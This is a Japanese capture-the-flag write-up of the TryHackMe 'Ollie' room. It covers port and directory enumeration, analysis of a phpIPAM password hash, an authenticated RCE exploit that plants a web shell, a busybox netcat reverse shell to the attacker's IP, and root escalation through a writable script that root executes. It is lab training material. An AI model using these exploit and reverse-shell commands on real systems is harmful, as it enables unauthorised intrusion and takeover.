# Ollie CTF

https://tryhackme.com/room/ollie

## Enumeration

```shell
TARGET=10.201.52.151
sudo bash -c "echo $TARGET   ollie.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -sS -p- $TARGET

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```sh
sudo nmap -sS -sV -p22,80 $TARGET

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

SSH, HTTP

```sh
root@ip-10-201-68-235:~# nikto -p 80 -T 1 2 3 -h $TARGET
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.201.52.151
+ Target Hostname:    ollie.thm
+ Target Port:        80
+ Start Time:         2025-10-29 04:32:01 (GMT0)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ Cookie phpipamredirect created without the httponly flag
+ The anti-clickjacking X-Frame-Options header is not present.
+ Root page / redirects to: http://ollie.thm/index.php?page=login
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server leaks inodes via ETags, header found with file /robots.txt, fields: 0x36 0x5d78bc43dcc97 
+ File/dir '/' in robots.txt returned a non-forbidden or redirect HTTP code (302)
+ File/dir '/immaolllieeboyyy/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 2 entries which should be manually viewed.
+ OSVDB-3268: /app/: Directory indexing found.
+ OSVDB-3092: /app/: This might be interesting...
+ OSVDB-3268: /db/: Directory indexing found.
+ OSVDB-3092: /db/: This might be interesting...
+ OSVDB-3092: /imgs/: This might be interesting...
+ OSVDB-3092: /install/: This might be interesting...
+ OSVDB-3268: /misc/: Directory indexing found.
+ OSVDB-3092: /misc/: This might be interesting...
+ OSVDB-3092: /INSTALL.txt: Default file found.
+ 1707 items checked: 0 error(s) and 15 item(s) reported on remote host
+ End Time:           2025-10-29 04:32:03 (GMT0) (2 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

- /immaolllieeboyyy/ ディレクトリ → https://www.youtube.com/watch?v=YIWSEa5U9_U に転送される
- その他、興味深いディレクトリ

### ディレクトリ列挙

```sh
root@ip-10-201-68-235:~# dirb http://$TARGET

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Oct 29 04:34:49 2025
URL_BASE: http://10.201.52.151/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.201.52.151/ ----
==> DIRECTORY: http://10.201.52.151/api/                                                                             
==> DIRECTORY: http://10.201.52.151/app/                                                                             
==> DIRECTORY: http://10.201.52.151/css/                                                                             
==> DIRECTORY: http://10.201.52.151/db/                                                                              
==> DIRECTORY: http://10.201.52.151/functions/                                                                       
==> DIRECTORY: http://10.201.52.151/imgs/                                                                            
+ http://10.201.52.151/index.php (CODE:302|SIZE:0)                                                                   
==> DIRECTORY: http://10.201.52.151/install/                                                                         
==> DIRECTORY: http://10.201.52.151/javascript/                                                                      
==> DIRECTORY: http://10.201.52.151/js/                                                                              
==> DIRECTORY: http://10.201.52.151/misc/                                                                            
+ http://10.201.52.151/robots.txt (CODE:200|SIZE:54)                                                                 
+ http://10.201.52.151/server-status (CODE:403|SIZE:278)                                                             
==> DIRECTORY: http://10.201.52.151/upgrade/                                                                         
                                                                                                                     
---- Entering directory: http://10.201.52.151/api/ ----
==> DIRECTORY: http://10.201.52.151/api/controllers/                                                                 
+ http://10.201.52.151/api/index.php (CODE:503|SIZE:69)                                                              
+ http://10.201.52.151/api/README (CODE:200|SIZE:1464)                                                               
                                                                                                                     
---- Entering directory: http://10.201.52.151/app/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://10.201.52.151/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://10.201.52.151/db/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://10.201.52.151/functions/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://10.201.52.151/imgs/ ----
+ http://10.201.52.151/imgs/index.htm (CODE:200|SIZE:0)                                                              
                                                                                                                     
---- Entering directory: http://10.201.52.151/install/ ----
+ http://10.201.52.151/install/index.php (CODE:200|SIZE:2445)                                                        
                                                                                                                     
---- Entering directory: http://10.201.52.151/javascript/ ----
==> DIRECTORY: http://10.201.52.151/javascript/jquery/                                                               
                                                                                                                     
---- Entering directory: http://10.201.52.151/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://10.201.52.151/misc/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://10.201.52.151/upgrade/ ----
+ http://10.201.52.151/upgrade/index.php (CODE:200|SIZE:2517)                                                        
                                                                                                                     
---- Entering directory: http://10.201.52.151/api/controllers/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://10.201.52.151/javascript/jquery/ ----
+ http://10.201.52.151/javascript/jquery/jquery (CODE:200|SIZE:271756)                                               
                                                                                                                     
-----------------
END_TIME: Wed Oct 29 04:35:09 2025
DOWNLOADED: 32284 - FOUND: 9
```

トップページは、http://ollie.thm/index.php?page=login 

`phpIPAM IP address management [v1.4.5]`

このバージョンには、要認証のRCEがある。

```sh
 searchsploit phpIPAM 1.4.5
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                          |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
phpIPAM 1.4.5 - Remote Code Execution (RCE) (Authenticated)                                                                                                                                             | php/webapps/50963.py
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

/db に sql ファイルがある。

```sh
$ cat ./UPDATE.sql 
/**
 * Update queries are stored in functions/upgrade_queries.php form version 1.4 onwards
 *
 * If you need list of all queries output to put directly to database
 * you can execute following php command to output queries:
 *
 *              php functions/upgrade_queries.php 1.3.2
 *
 * where 1.3.2 is version you are currently using.
 *
 * To save it to file create output edirection:
 *
 *              php functions/upgrade_queries.php 1.3.2 > UPDATE.sql
 */
 ```

UPDATE.sql

```sql
INSERT INTO `users` (`id`, `username`, `password`, `groups`, `role`, `real_name`, `email`, `domainUser`,`widgets`, `passChange`)
VALUES
	(1,'Admin',X'243624726F756E64733D33303030244A51454536644C394E70766A6546733424524B3558336F6132382E557A742F6835564166647273766C56652E3748675155594B4D58544A5573756438646D5766507A5A51506252626B38784A6E314B797974342E64576D346E4A4959684156326D624F5A33672E',X'','Administrator','phpIPAM Admin','admin@domain.local',X'30','statistics;favourite_subnets;changelog;access_logs;error_logs;top10_hosts_v4', 'Yes');
```

hex2asciiするとハッシュ値になる。

```
$6$rounds=3000$JQEE6dL9NpvjeFs4$RK5X3oa28.Uzt/h5VAfdrsvlVe.7HgQUYKMXTJUsud8dmWfPzZQPbRbk8xJn1Kyyt4.dWm4nJIYhAV2mbOZ3g.
```

`7400	sha256crypt $5$, SHA256 (Unix) 2` の sha512バージョンのハッシュに見えるが、hashcatには対応するモードがない。

[ソース](https://github.com/phpipam/phpipam/blob/master/functions/classes/class.User.php#L1599)を確認。

- '$6$rounds=3000$' が prefix
- 続く22文字がソルト

```php
    public function crypt_user_pass ($input) {
        # initialize salt
        $salt = "";
        # set possible salt characters in array
        $salt_chars = array_merge(range('A','Z'), range('a','z'), range(0,9));
        # loop to create salt
        for($i=0; $i < 22; $i++) { $salt .= $salt_chars[array_rand($salt_chars)]; }
        # get prefix
        $prefix = $this->detect_crypt_type ();
        # return crypted variable
        return crypt($input, $prefix.$salt);
    }

    /**
     *    this function will detect highest crypt type to use for system
     *
     * @access public
     * @return string
     */
    private function detect_crypt_type () {
        if(CRYPT_SHA512 == 1)        { return '$6$rounds=3000$'; }
        elseif(CRYPT_SHA256 == 1)    { return '$5$rounds=3000$'; }
        elseif(CRYPT_BLOWFISH == 1)  { return '$2y$'.str_pad(rand(4,31),2,0, STR_PAD_LEFT).'$'; }
        elseif(CRYPT_MD5 == 1)       { return '$5$rounds=3000$'; }
        else                         { $this->Result->show("danger", _("No crypt types supported"), true); }
    }
```

[PHPのcrypt関数仕様](https://www.php.net/manual/ja/function.crypt.php)によると、

```
CRYPT_SHA512 - SHA-512 ハッシュに $6$ で始まる 16 文字の salt を組み合わせたもの。salt 文字列が 'rounds=<N>$' で始まる場合は、数値 N がハッシュループの実行回数を表します。 これは Blowfish のコストパラメータのようなものです。 rounds のデフォルトは 5000 で、1000 から 999,999,999 までの値を指定できます。 この範囲外の N を指定すると、近い方の境界値に切り詰められます。
```

ということで、ランダム生成された22文字のソルトのうち、6文字が切り捨てられて `JQEE6dL9NpvjeFs4` の16文字がソルトということになっている。

それを踏まえて、rockyou.txt ではクラック成功しなかった。（Exhausted）

```sh
.\hashcat.exe -m 1800 hash.txt rockyou.txt
```

行き詰った。

もう一度nmapしたら、前回は出てこなかったポートが出てきた・・・

```sh
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
1337/tcp open  waste
```

### 1337

パスワード発見・・・。これは rockyou.txt では割れない。

```sh
$ nc $TARGET 1337
Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.

What is your name? foo
What's up, Foo! It's been a while. What are you here for? hack
Ya' know what? Foo. If you can answer a question about me, I might have something for you.


What breed of dog am I? I'll make it a multiple choice question to keep it easy: Bulldog, Husky, Duck or Wolf? Bulldog
You are correct! Let me confer with my trusted colleagues; Benny, Baxter and Connie...
Please hold on a minute
Ok, I'm back.
After a lengthy discussion, we've come to the conclusion that you are the right person for the job.Here are the credentials for our administration panel.

                    Username: admin

                    Password: [REDACTED]

PS: Good luck and next time bring some treats!
```

RCE成功。

```sh
$ python ./50963.py -url http://ollie.thm/ -usr admin -pwd [REDACTED]     

█▀█ █░█ █▀█ █ █▀█ ▄▀█ █▀▄▀█   ▄█ ░ █░█ ░ █▀   █▀ █▀█ █░░ █   ▀█▀ █▀█   █▀█ █▀▀ █▀▀
█▀▀ █▀█ █▀▀ █ █▀▀ █▀█ █░▀░█   ░█ ▄ ▀▀█ ▄ ▄█   ▄█ ▀▀█ █▄▄ █   ░█░ █▄█   █▀▄ █▄▄ ██▄

█▄▄ █▄█   █▄▄ █▀▀ █░█ █ █▄░█ █▀▄ █▄█ █▀ █▀▀ █▀▀
█▄█ ░█░   █▄█ ██▄ █▀█ █ █░▀█ █▄▀ ░█░ ▄█ ██▄ █▄▄

[...] Trying to log in as admin
[+] Login successful!
[...] Exploiting
[+] Success! The shell is located at http://ollie.thm/evil.php. Parameter: cmd


[+] Output:
1        uid=33(www-data) gid=33(www-data) groups=33(www-data)
        3       4
```

リバースシェル

```sh
$ python ./50963.py -url http://ollie.thm/ -usr admin -pwd [REDACTED] -cmd 'busybox nc 10.11.146.32 8888 -e /bin/sh'
```

```sh
$ nc -lnvp 8888
listening on [any] 8888 ...
connect to [10.11.146.32] from (UNKNOWN) [10.201.52.151] 45188
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## 権限昇格

user.txt を発見したが読めない。

```sh
www-data@ip-10-201-52-151:/home$ cd /home/ollie
www-data@ip-10-201-52-151:/home/ollie$ ls -al
total 36
drwxr-xr-x 5 ollie ollie 4096 Feb 10  2022 .
drwxr-xr-x 4 root  root  4096 Oct 29 04:30 ..
lrwxrwxrwx 1 root  root     9 Feb  6  2022 .bash_history -> /dev/null
-rw-r--r-- 1 ollie ollie  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 ollie ollie 3771 Feb 25  2020 .bashrc
drwx------ 2 ollie ollie 4096 Feb  6  2022 .cache
drwxrwxr-x 3 ollie ollie 4096 Feb  6  2022 .config
drwxrwxr-x 3 ollie ollie 4096 Feb  6  2022 .local
-rw-r--r-- 1 ollie ollie  807 Feb 25  2020 .profile
-rw-r--r-- 1 ollie ollie    0 Feb 10  2022 .sudo_as_admin_successful
-r-x------ 1 ollie ollie   29 Feb 10  2022 user.txt
```

同じパスワードで昇格できた。

```sh
www-data@ip-10-201-52-151:/home/ollie$ su ollie 
Password: 
ollie@ip-10-201-52-151:~$ 
```

## 権限昇格２

不自然なollieグループのバイナリがある。実行はできないが、読み書き可。

```sh
www-data@ip-10-201-52-151:/home/ollie$ ls -al /usr/bin/feedme
-rwxrw-r-- 1 root ollie 30 Feb 12  2022 /usr/bin/feedme
```

```sh
ollie@ip-10-201-52-151:~$ cat /usr/bin/feedme
#!/bin/bash

# This is weird?
```

pspy でプロセスを監視すると、rootがfeedmeを実行している形跡がある。

```sh
2025/10/29 06:47:58 CMD: UID=0     PID=3      | 
2025/10/29 06:47:58 CMD: UID=0     PID=2      | 
2025/10/29 06:47:58 CMD: UID=0     PID=1      | /sbin/init auto automatic-ubiquity noprompt 
2025/10/29 06:48:03 CMD: UID=0     PID=4308   | (feedme) 
2025/10/29 06:48:04 CMD: UID=0     PID=4309   | 
2025/10/29 06:48:19 CMD: UID=0     PID=4311   | /usr/bin/amazon-ssm-agent 
2025/10/29 06:49:04 CMD: UID=0     PID=4312   | (feedme) 
```

feedme にリバースシェルを追加したらrootシェルを取れた。

```sh
$ nc -lnvp 8889
listening on [any] 8889 ...
connect to [10.11.146.32] from (UNKNOWN) [10.201.52.151] 44678
id
uid=0(root) gid=0(root) groups=0(root)
ls /root
root.txt
snap
```

## 振り返り

- 1回目のnmapで1337ポートが出てこなかったことに尽きる。PHPのハッシュについては少し良い勉強になった。
- 3時間近くかかったが、1337ポートが最初から出ていたら20分で終わっていた内容な気がする。
- 次からは必ず、起動後5分は置くことにする。
